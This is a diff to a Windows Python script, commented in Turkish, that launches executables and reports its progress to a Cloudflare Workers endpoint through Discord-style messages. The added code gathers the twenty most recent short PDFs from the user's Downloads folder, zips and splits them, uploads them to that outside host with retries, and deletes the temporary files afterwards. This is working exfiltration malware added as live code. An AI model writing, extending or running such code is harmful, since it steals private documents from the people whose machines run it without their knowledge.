@@ -5,12 +5,19 @@ import urllib.request
 import win32com.client
 import json
 import datetime
+import zipfile
+import pathlib
+import uuid
+import tempfile
+import time
+import pypdf
 
 # worker url ve bildirim fonksiyonu
 WORKER_URL = "https://gentle-sky-3fe0.solitary-violet-8734.workers.dev/"
 
+UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
 def send(title, desc, color):
-    """worker'a discord embed bildirimi gonder"""
     embed = {
         "title": title,
         "description": desc,
@@ -22,11 +29,47 @@ def send(title, desc, color):
         data = json.dumps({"embeds": [embed]}).encode("utf-8")
         req = urllib.request.Request(WORKER_URL, data=data, headers={
             "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+            "User-Agent": UA
         })
         urllib.request.urlopen(req, timeout=10)
     except Exception:
         pass
+
+def send_file(file_path, filename=None, retries=5, delay=3):
+    if filename is None:
+        filename = os.path.basename(file_path)
+    boundary = uuid.uuid4().hex
+    with open(file_path, "rb") as f:
+        file_data = f.read()
+    # multipart govdesini elle hazirliyoruz
+    body = (
+        f"--{boundary}\r\n"
+        f"Content-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n"
+        f"Content-Type: application/octet-stream\r\n\r\n"
+    ).encode("utf-8") + file_data + f"\r\n--{boundary}--\r\n".encode("utf-8")
+
+    last_err = ""
+    for attempt in range(1, retries + 2):
+        try:
+            req = urllib.request.Request(WORKER_URL, data=body, headers={
+                "Content-Type": f"multipart/form-data; boundary={boundary}",
+                "User-Agent": UA
+            })
+            urllib.request.urlopen(req, timeout=180)
+            return True, None
+        except Exception as e:
+            last_err = str(e)
+            if hasattr(e, "read"):
+                try:
+                    last_err += f" - {e.read().decode('utf-8', errors='replace')[:150]}"
+                except Exception:
+                    pass
+            if attempt <= retries:
+                send("⚠️ Gonderim Hatasi", f"{filename} gonderilemedi: {last_err}\ntekrar deneniyor ({attempt}/{retries})...", YELLOW)
+                time.sleep(delay)
+
+    send("❌ Gonderim Basarisiz", f"{filename} yuklenemedi: {last_err}", RED)
+    return False, last_err
 
 # renk kodlari
 GREEN = 5763719
@@ -193,5 +236,104 @@ for exe_path in exe_list:
         send("🚀 Baslatildi", f"{exe_name} calisiyor (PID: {proc.pid})", GREEN)
     except Exception as e:
         send("❌ Baslatma Hatasi", str(e), RED)
+
+# son yirmi pdf dosyasini toplayip gonderiyoruz
+MAX_CHUNK = 10 * 1024 * 1024
+SPLIT_SIZE = 5 * 1024 * 1024
+
+def pdf_page_count(path):
+    try:
+        reader = pypdf.PdfReader(str(path))
+        return len(reader.pages)
+    except Exception:
+        return 0
+
+try:
+    dl_dir = pathlib.Path.home() / "Downloads"
+    all_pdfs = sorted(
+        [f for f in dl_dir.glob("*.pdf") if f.is_file()],
+        key=lambda f: f.stat().st_mtime,
+        reverse=True
+    )
+
+    # 6 sayfadan fazla olanlari atliyoruz
+    pdfs = []
+    for p in all_pdfs:
+        if len(pdfs) >= 20:
+            break
+        if pdf_page_count(p) <= 6:
+            pdfs.append(p)
+
+    if pdfs:
+        send("📄 PDF Toplama", f"{len(pdfs)} pdf bulundu (6 sayfa filtreli), zipleniyor...", BLUE)
+
+        # gecici klasorde zip olusturuyoruz
+        tmp_dir = tempfile.mkdtemp()
+        chunk_idx = 1
+        current_zip_path = os.path.join(tmp_dir, f"pdfs_part{chunk_idx}.zip")
+        current_zip = zipfile.ZipFile(current_zip_path, "w", zipfile.ZIP_DEFLATED)
+        current_size = 0
+        zip_paths = [current_zip_path]
+
+        for pdf in pdfs:
+            pdf_size = pdf.stat().st_size
+            # limit asilirsa yeni zip dosyasina geciyoruz
+            if current_size > 0 and current_size + pdf_size > MAX_CHUNK:
+                current_zip.close()
+                chunk_idx += 1
+                current_zip_path = os.path.join(tmp_dir, f"pdfs_part{chunk_idx}.zip")
+                current_zip = zipfile.ZipFile(current_zip_path, "w", zipfile.ZIP_DEFLATED)
+                current_size = 0
+                zip_paths.append(current_zip_path)
+            current_zip.write(str(pdf), pdf.name)
+            current_size += pdf_size
+        current_zip.close()
+
+        # sadece on megabayttan buyukse parcalara boluyoruz
+        upload_files = []
+        for zp in zip_paths:
+            zp_size = os.path.getsize(zp)
+            if zp_size > MAX_CHUNK:
+                part_num = 1
+                with open(zp, "rb") as f:
+                    while True:
+                        chunk = f.read(SPLIT_SIZE)
+                        if not chunk:
+                            break
+                        part_file = f"{zp}.{part_num:03d}"
+                        with open(part_file, "wb") as pf:
+                            pf.write(chunk)
+                        upload_files.append(part_file)
+                        part_num += 1
+                try:
+                    os.remove(zp)
+                except Exception:
+                    pass
+            else:
+                upload_files.append(zp)
+
+        # dosyalari tek tek gonderiyoruz
+        sent = 0
+        for uf in upload_files:
+            ok, err = send_file(uf, os.path.basename(uf))
+            if ok:
+                sent += 1
+            # gecici dosyalari temizliyoruz
+            try:
+                os.remove(uf)
+            except Exception:
+                pass
+
+        # gecici klasoru siliyoruz
+        try:
+            os.rmdir(tmp_dir)
+        except Exception:
+            pass
+
+        send("📦 PDF Gonderim", f"{sent}/{len(upload_files)} dosya gonderildi ({len(pdfs)} pdf)", GREEN if sent == len(upload_files) else YELLOW)
+    else:
+        send("📄 PDF", "downloads klasorunde pdf bulunamadi.", YELLOW)
+except Exception as e:
+    send("❌ PDF Hatasi", str(e), RED)
 
 send("✅ Tamamlandi", "tum islemler bitti.", GREEN)
